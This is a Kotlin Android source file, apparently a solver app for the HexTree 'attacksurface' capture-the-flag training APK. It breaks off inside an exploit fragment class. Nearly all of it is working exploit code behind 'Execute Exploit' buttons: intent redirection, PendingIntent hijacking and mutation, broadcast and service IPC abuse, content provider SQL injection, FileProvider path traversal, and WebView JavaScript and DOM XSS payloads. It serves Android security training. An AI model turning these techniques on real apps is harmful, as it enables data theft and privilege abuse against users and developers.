package com.example.hextreesolver

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.hextreesolver.ui.theme.HexTreeSolverTheme

import android.app.PendingIntent
import android.content.Intent
import android.content.ComponentName
import androidx.compose.ui.platform.LocalContext
import android.net.Uri
import android.util.Log
import android.widget.Toast

import androidx.core.content.ContextCompat
import androidx.compose.material3.ScrollableTabRow
import androidx.compose.material3.Tab
import androidx.compose.material3.Icon
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ExpandLess
import androidx.compose.material.icons.filled.ExpandMore
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.animation.animateContentSize
import androidx.compose.material3.ElevatedCard
import androidx.compose.ui.draw.clip
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.width

// this is a POC app to hextree intent attacks apk
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Process intent if app is opened directly via system chooser / implicit intent
        handleIncomingIntent(intent)

        setContent {
            HexTreeSolverTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    MainContent(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent) // Ensures getIntent() stays updated

        // Process intent if app was already running in background/foreground
        handleIncomingIntent(intent)
    }

    // Shared handler for Flag 22, 23, and future callback flags
    private fun handleIncomingIntent(intent: Intent?) {
        if (intent == null) return

        // --- FLAG 23 MUTATION LOGIC ---
        if (intent.action == "io.hextree.attacksurface.MUTATE_ME") {
            val pendingIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("pending_intent", PendingIntent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("pending_intent") as? PendingIntent
            }

            if (pendingIntent != null) {
                // Attach the required "code" extra set to 42
                val fillInIntent = Intent().apply {
                    putExtra("code", 42)
                }

                try {
                    // Mutate and send back to Flag23Activity
                    pendingIntent.send(this, 0, fillInIntent)
                    Log.d("FLAG23", "Boom! PendingIntent mutated and sent back successfully.")
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        // --- FLAG CAPTURE LOGIC (FLAG 22 & OTHERS) ---
        if (intent.hasExtra("flag")) {
            val stolenFlag = intent.getStringExtra("flag")

            // 1. Print it to Logcat so you can copy/paste it
            Log.d("STOLEN_FLAG", "BOOM! Got Flag: $stolenFlag")

            // 2. Pop it up on your device screen as a Toast notification
            Toast.makeText(this, "Flag: $stolenFlag", Toast.LENGTH_LONG).show()
        }
        if (intent.action == "io.hextree.FLAG33") {
            try {
                val uri = intent.data ?: return

                // We securely possess read access to the hidden provider!
                // Execute the SQL Injection via the projection parameter
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("'flag33'"), // Translates to: SELECT 'flag33' FROM flags
                    null, null, null
                )

                cursor?.close()
                Log.d("FLAG33.2", "Intercepted intent and fired SQLi!")

            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}


@Composable
fun MainContent(modifier: Modifier = Modifier) {
    Column(modifier = modifier.fillMaxSize().background(MaterialTheme.colorScheme.background)) {
        HeaderSection()
        ButtonList()
    }
}

@Composable
fun HeaderSection() {
    Surface(
        modifier = Modifier.fillMaxWidth(),
        color = MaterialTheme.colorScheme.primary,
        shadowElevation = 4.dp
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "HexTree Solver POC",
                style = MaterialTheme.typography.headlineSmall.copy(
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.onPrimary
                )
            )
            Text(
                text = "Gohary's exploit collection",
                style = MaterialTheme.typography.labelMedium.copy(
                    color = MaterialTheme.colorScheme.onPrimary.copy(alpha = 0.8f)
                )
            )
        }
    }
}

@Composable
fun FlagItem(id: Any, explanation: String, onButtonClick: () -> Unit) {
    var expanded by remember { mutableStateOf(false) }
    
    ElevatedCard(
        modifier = Modifier
            .fillMaxWidth()
            .animateContentSize(),
        elevation = CardDefaults.elevatedCardElevation(defaultElevation = 2.dp),
        colors = CardDefaults.elevatedCardColors(
            containerColor = if (expanded) 
                MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.3f) 
                else MaterialTheme.colorScheme.surface
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .clickable { expanded = !expanded }
                .padding(16.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        modifier = Modifier.clip(RoundedCornerShape(4.dp)),
                        color = MaterialTheme.colorScheme.primary
                    ) {
                        Text(
                            text = "Flag $id",
                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp),
                            style = MaterialTheme.typography.labelLarge,
                            color = MaterialTheme.colorScheme.onPrimary,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
                
                Icon(
                    imageVector = if (expanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                    contentDescription = if (expanded) "Show less" else "Show more",
                    tint = MaterialTheme.colorScheme.primary
                )
            }
            
            if (expanded) {
                Spacer(modifier = Modifier.height(12.dp))
                Text(
                    text = explanation,
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(16.dp))
                Button(
                    onClick = { 
                        onButtonClick()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Icon(Icons.Default.PlayArrow, contentDescription = null)
                    Spacer(Modifier.width(8.dp))
                    Text("Execute Exploit")
                }
            }
        }
    }
}

@Composable
fun ButtonList() {
    val context = LocalContext.current
    var selectedTabIndex by remember { mutableStateOf(0) }
    val categories = listOf("Act", "Int", "Brc", "Svc", "Prv", "Web")

    Column(modifier = Modifier.fillMaxSize()) {
        ScrollableTabRow(
            selectedTabIndex = selectedTabIndex,
            edgePadding = 16.dp,
            containerColor = MaterialTheme.colorScheme.surface,
            contentColor = MaterialTheme.colorScheme.primary
        ) {
            categories.forEachIndexed { index, title ->
                Tab(
                    selected = selectedTabIndex == index,
                    onClick = { selectedTabIndex = index },
                    text = { Text(title, style = MaterialTheme.typography.labelLarge) }
                )
            }
        }

        LazyColumn(
            modifier = Modifier.fillMaxSize(),
            contentPadding = PaddingValues(16.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            when (selectedTabIndex) {
                0 -> { // Activities 1-7
                    item {
                        FlagItem( id = 1,
                            explanation = "The Problem Here that the Activity is exported, any app can call it with an intent and launch it"
                        ) {
                            try {
                                val intent = Intent().apply {
                                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity")
                                }
                                context.startActivity(intent)
                            } catch (e: Exception) { e.printStackTrace() }
                        }
                    }
                    item { FlagItem(2, "Same, Exported Activity, but this time it needed an action in the intent to reveal the flag") {
                        try {
                            val intent = Intent().apply {
                                action = "io.hextree.action.GIVE_FLAG"
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity")
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(3, "Same, Exported Activity, but this time it needed an action and a data URI in the intent to reveal the flag") {
                        try {
                            val intent = Intent().apply {
                                action = "io.hextree.action.GIVE_FLAG"
                                data = Uri.parse("https://app.hextree.io/map/android")
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity")
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item {
                        var exploitStep by remember { mutableStateOf(1) }
                        FlagItem(4, "State Machine Attack: Requires a 4-step sequence of specific intent actions without breaking the chain. Next Step to click: 4 times") {
                            try {
                                val intent = Intent().apply {
                                    action = when (exploitStep) {
                                        1 -> "PREPARE_ACTION"
                                        2 -> "BUILD_ACTION"
                                        3 -> "GET_FLAG_ACTION"
                                        else -> "ANY_FINAL_ACTION"
                                    }
                                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity")
                                }
                                context.startActivity(intent)
                                exploitStep = if (exploitStep < 4) exploitStep + 1 else 1
                            } catch (e: Exception) { e.printStackTrace() }
                        }
                    }
                    item { FlagItem(5, "Intent-in-Intent redirection: We must wrap a second intent inside the first nested intent to hit the 'success' condition.") {
                        try {
                            val nestedIntent2 = Intent().apply { putExtra("reason", "back") }
                            val nestedIntent1 = Intent().apply { putExtra("return", 42); putExtra("nextIntent", nestedIntent2) }
                            val outerIntent = Intent().apply {
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity")
                                putExtra("android.intent.extra.INTENT", nestedIntent1)
                            }
                            context.startActivity(outerIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(6, "This activity is not exported, but a misconfig in flag5 (Intent Redirection) allows accessing it.") {
                        try {
                            val nestedIntent2 = Intent().apply {
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity")
                                putExtra("reason", "next")
                                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                            }
                            val nestedIntent1 = Intent().apply { putExtra("return", 42); putExtra("nextIntent", nestedIntent2) }
                            val outerIntent = Intent().apply {
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity")
                                putExtra("android.intent.extra.INTENT", nestedIntent1)
                            }
                            context.startActivity(outerIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(7, "Activity Lifecycle Trick: Requires sending 'OPEN' to instantiate, followed immediately by 'REOPEN' for onNewIntent.") {
                        try {
                            val openIntent = Intent().apply {
                                action = "OPEN"
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            val reopenIntent = Intent().apply {
                                action = "REOPEN"
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity")
                                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(openIntent)
                            context.startActivity(reopenIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                }
                1 -> { // Intents 8-15
                    item { FlagItem(8, "Exploits ActivityResult validation, it checks if the class that sent the intent has 'HexTree'") {
                        try { context.startActivity(Intent(context, HextreeFlag8and9Activity::class.java)) } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(9, "Launches Flag 9 via proxy to bypass origin verification, then listens for data callback.") {
                        try { context.startActivity(Intent(context, HextreeFlag8and9Activity::class.java).apply { putExtra("target_flag", 9) }) } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(10, "Intent Hijacking: Catch the outgoing broadcast intent launched by the target application.") {
                        try {
                            val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag10Activity") }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(11, "Implicit Intent Handshake: Intercepts 'ATTACK_ME' and returns validation token.") {
                        try {
                            val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag11Activity") }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(12, "Conditional Implicit Interception: Pass a 'LOGIN' boolean extra to bypass return guard.") {
                        try {
                            val intent = Intent().apply {
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity")
                                putExtra("LOGIN", true)
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(13, "Deeplink Exploitation: Constructs intent matching isDeeplink verification.") {
                        try {
                            val intent = Intent().apply {
                                action = Intent.ACTION_VIEW
                                addCategory(Intent.CATEGORY_BROWSABLE)
                                data = Uri.parse("hex://flag?action=give-me")
                                putExtra("com.android.browser.application_id", "com.android.browser")
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag13Activity")
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(14, "Deep Link Hijacking: Intercept login redirect and rewrite type=user -> type=admin.") {
                        try {
                            val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity") }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(15, "Deeplink validation bypass: Satisfy isDeeplink() with specific action and extras.") {
                        try {
                            val intent = Intent().apply {
                                action = "io.hextree.action.GIVE_FLAG"
                                addCategory(Intent.CATEGORY_BROWSABLE)
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag15Activity")
                                putExtra("com.android.browser.application_id", "com.android.browser")
                                putExtra("action", "flag"); putExtra("flag", true)
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                }
                2 -> { // Broadcasts 16-21
                    item { FlagItem(16, "Exported Broadcast Receiver: Triggers by explicit broadcast with 'flag' extra.") {
                        try {
                            val intent = Intent().apply {
                                component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver")
                                putExtra("flag", "give-flag-16")
                            }
                            context.sendBroadcast(intent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(17, "Ordered Broadcast: Uses sendOrderedBroadcast and supply a local resultReceiver.") {
                        try {
                            val intent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver"); putExtra("flag", "give-flag-17") }
                            val resultReceiver = object : android.content.BroadcastReceiver() {
                                override fun onReceive(ctx: android.content.Context, intent: Intent?) {
                                    val results = getResultExtras(true)
                                    if (results.getBoolean("success", false)) {
                                        val flag = results.getString("flag")
                                        Log.d("FLAG17", "BOOM! Got Flag: $flag")
                                        Toast.makeText(ctx, "Flag 17: $flag", Toast.LENGTH_LONG).show()
                                    }
                                }
                            }
                            context.sendOrderedBroadcast(intent, null, resultReceiver, null, android.app.Activity.RESULT_OK, null, null)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(18, "Broadcast Interception: Registers receiver dynamically, then opens Hextree.") {
                        try {
                            val appContext = context.applicationContext
                            val receiver = object : android.content.BroadcastReceiver() {
                                override fun onReceive(ctx: android.content.Context, intent: Intent) {
                                    val flag = intent.getStringExtra("flag")
                                    Toast.makeText(ctx, "Got Flag 18: $flag", Toast.LENGTH_LONG).show()
                                    resultCode = android.app.Activity.RESULT_OK
                                    ctx.unregisterReceiver(this)
                                }
                            }
                            val filter = android.content.IntentFilter("io.hextree.broadcast.FREE_FLAG")
                            ContextCompat.registerReceiver(appContext, receiver, filter, ContextCompat.RECEIVER_EXPORTED)
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(19, "Widget Provider bypass: Uses custom action string containing 'APPWIDGET_UPDATE'.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val intent = Intent().apply {
                                    component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget")
                                    action = "APPWIDGET_UPDATE"
                                    val optionsBundle = Bundle().apply { putInt("appWidgetMaxHeight", 1094795585); putInt("appWidgetMinHeight", 322376503) }
                                    putExtra("appWidgetOptions", optionsBundle)
                                }
                                context.sendBroadcast(intent)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(20, "Dynamic Receiver Targeting: Target by Action while injecting 'give-flag'=true.") {
                        try {
                            Toast.makeText(context, "⏳ Switch to HexTree NOW!", Toast.LENGTH_LONG).show()
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val intent = Intent().apply { action = "io.hextree.broadcast.GET_FLAG"; setPackage("io.hextree.attacksurface"); putExtra("give-flag", true) }
                                context.sendBroadcast(intent)
                            }, 3500)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(21, "Notification Hijacking: Listens for implicit intent broadcast from notification.") {
                        try {
                            val appContext = context.applicationContext
                            val receiver = object : android.content.BroadcastReceiver() {
                                override fun onReceive(ctx: android.content.Context, intent: Intent) {
                                    val flag = intent.getStringExtra("flag")
                                    Toast.makeText(ctx, "Got Flag 21: $flag", Toast.LENGTH_LONG).show()
                                    ctx.unregisterReceiver(this)
                                }
                            }
                            val filter = android.content.IntentFilter("io.hextree.broadcast.GIVE_FLAG")
                            ContextCompat.registerReceiver(appContext, receiver, filter, ContextCompat.RECEIVER_EXPORTED)
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                }
                3 -> { // Services 22-29
                    item { FlagItem(22, "PendingIntent Hijacking (Activity): Deliver mutable PendingIntent to capture flag.") {
                        try {
                            val callbackIntent = Intent(context, MainActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP) }
                            val pendingIntentFlags = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
                            val mutablePendingIntent = PendingIntent.getActivity(context, 2222, callbackIntent, pendingIntentFlags)
                            val targetIntent = Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"); putExtra("PENDING", mutablePendingIntent) }
                            context.startActivity(targetIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(23, "PendingIntent Hijacking: Mutate PendingIntent in handleIncomingIntent.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(24, "Exported Service: Starts Flag24Service via its exported action.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val svcIntent = Intent().apply { action = "io.hextree.services.START_FLAG24_SERVICE"; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service") }
                                context.startService(svcIntent)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(25, "Multi-Stage Service Unlock: Sends three sequential UNLOCK actions.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                listOf("io.hextree.services.UNLOCK1", "io.hextree.services.UNLOCK2", "io.hextree.services.UNLOCK3").forEach { act ->
                                    context.startService(Intent().apply { action = act; component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service") })
                                }
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(26, "Bound Service / Messenger IPC: Binds and sends Message 42.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val connection = object : android.content.ServiceConnection {
                                    override fun onServiceConnected(cn: ComponentName, svc: android.os.IBinder) {
                                        android.os.Messenger(svc).send(android.os.Message.obtain(null, 42)); context.unbindService(this)
                                    }
                                    override fun onServiceDisconnected(cn: ComponentName) {}
                                }
                                context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(27, "Bidirectional IPC: Capture password and send back with replyTo.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val connection = object : android.content.ServiceConnection {
                                    override fun onServiceConnected(cn: ComponentName, svc: android.os.IBinder) {
                                        val thisConnection = this
                                        val remote = android.os.Messenger(svc)
                                        val h = object : android.os.Handler(android.os.Looper.getMainLooper()) {
                                            override fun handleMessage(m: android.os.Message) {
                                                if (m.what == 2) {
                                                    val p = m.data.getString("password")
                                                    if (p != null) {
                                                        val m3 = android.os.Message.obtain(null, 3); m3.data = Bundle().apply { putString("password", p) }; m3.replyTo = android.os.Messenger(this)
                                                        remote.send(m3); android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ context.unbindService(thisConnection) }, 500)
                                                    }
                                                }
                                            }
                                        }
                                        val local = android.os.Messenger(h)
                                        remote.send(android.os.Message.obtain(null, 1).apply { data = Bundle().apply { putString("echo", "give flag") }; replyTo = local })
                                        remote.send(android.os.Message.obtain(null, 2).apply { replyTo = local; obj = Bundle() })
                                    }
                                    override fun onServiceDisconnected(cn: ComponentName) {}
                                }
                                context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(28, "AIDL Interface: Executes raw binder transaction code 1.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val connection = object : android.content.ServiceConnection {
                                    override fun onServiceConnected(cn: ComponentName, b: android.os.IBinder) {
                                        val d = android.os.Parcel.obtain(); val r = android.os.Parcel.obtain(); d.writeInterfaceToken("io.hextree.attacksurface.services.IFlag28Interface")
                                        b.transact(android.os.IBinder.FIRST_CALL_TRANSACTION, d, r, 0); r.readException(); d.recycle(); r.recycle(); context.unbindService(this)
                                    }
                                    override fun onServiceDisconnected(cn: ComponentName) {}
                                }
                                context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(29, "Multi-Stage AIDL: Chain of three raw binder transactions.") {
                        try {
                            val launchIntent = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                            if (launchIntent != null) context.startActivity(launchIntent)
                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                val connection = object : android.content.ServiceConnection {
                                    override fun onServiceConnected(cn: ComponentName, b: android.os.IBinder) {
                                        val desc = "io.hextree.attacksurface.services.IFlag29Interface"
                                        var d = android.os.Parcel.obtain(); var r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); b.transact(1, d, r, 0); r.readException(); val p = r.readString(); d.recycle(); r.recycle()
                                        if (p != null) { d = android.os.Parcel.obtain(); r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); d.writeString(p); b.transact(2, d, r, 0); r.readException(); d.recycle(); r.recycle()
                                            d = android.os.Parcel.obtain(); r = android.os.Parcel.obtain(); d.writeInterfaceToken(desc); b.transact(3, d, r, 0); r.readException(); d.recycle(); r.recycle() }
                                        context.unbindService(this)
                                    }
                                    override fun onServiceDisconnected(cn: ComponentName) {}
                                }
                                context.bindService(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service") }, connection, android.content.Context.BIND_AUTO_CREATE)
                            }, 800)
                        } catch (e: Exception) { e.printStackTrace() } } }
                }
                4 -> { // Providers 30-34
                    item { FlagItem(30, "Content Provider: Directly query '/success' path.") {
                        try { context.contentResolver.query(Uri.parse("content://io.hextree.flag30/success"), null, null, null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(31, "Content Provider UriMatcher: Pass '31' as appended ID.") {
                        try { context.contentResolver.query(Uri.parse("content://io.hextree.flag31/flag/31"), null, null, null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(32, "Content Provider SQL Injection: Bypasses visibility via WHERE injection.") {
                        try { context.contentResolver.query(Uri.parse("content://io.hextree.flag32/flags"), null, "1) OR 1=1 OR (1", null, null)?.close() } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem("33.1", "URI Permission Leak + SQLi: Steal read access via startActivityForResult.") {
                        try {
                            var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                            (act as? android.app.Activity)?.let { a ->
                                a.startActivityForResult(Intent("io.hextree.FLAG33").apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1") }, 33)
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    val li = context.packageManager.getLaunchIntentForPackage("io.hextree.attacksurface")
                                    if (li != null) context.startActivity(li)
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                        a.contentResolver.query(Uri.parse("content://io.hextree.flag33_1/flags"), arrayOf("'flag33'"), null, null, null)?.close()
                                    }, 500)
                                }, 1200)
                            }
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem("33.2", "Implicit Intent Permission Leak: MainActivity catches it.") {
                        try { context.startActivity(Intent().apply { component = ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity2") }) } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(34, "Empty Action as requested.") { /* Button 34 Action is empty */ } }
                }
                5 -> { // Web 35-41
                    item { FlagItem(35, "Root-FileProvider Traversal: Request '../flag35.txt'.") {
                        try {
                            var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                            (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag35ExploitFragment(), "f35")?.commit()
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(36, "Cross-Activity FileProvider Abuse: Overwrite shared_prefs.") {
                        try {
                            var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                            (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag36ExploitFragment(), "f36")?.commit()
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(37, "Flag 37 Placeholder") { /* Placeholder */ } }
                    item { FlagItem(38, "WebView JS Interface: Inject 'javascript:hextree.success(true)'.") {
                        try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"); putExtra("URL", "javascript:hextree.success(true)") }) } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(39, "DOM XSS: Inject img tag with onerror handler.") {
                        try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"); putExtra("NAME", "<img src=x onerror=hextree.success()>") }) } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(40, "Universal File Access bypass: Inject JS to read local token.") {
                        try {
                            var act = context; while (act is android.content.ContextWrapper && act !is android.app.Activity) act = act.baseContext
                            (act as? android.app.Activity)?.fragmentManager?.beginTransaction()?.add(Flag40ExploitFragment(), "f40")?.commit()
                        } catch (e: Exception) { e.printStackTrace() } } }
                    item { FlagItem(41, "Custom Tabs Service Spoofing: Spoof PostMessage directly over IPC.") {
                        try { context.startActivity(Intent().apply { setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag41Activity") }) } catch (e: Exception) { e.printStackTrace() } } }
                }
            }
        }
    }
}

@Preview(showBackground = true)
@Composable
fun MainContentPreview() {
    HexTreeSolverTheme { MainContent() }
}

class Flag35ExploitFragment : android.app.Fragment() {
    private var stage = 1
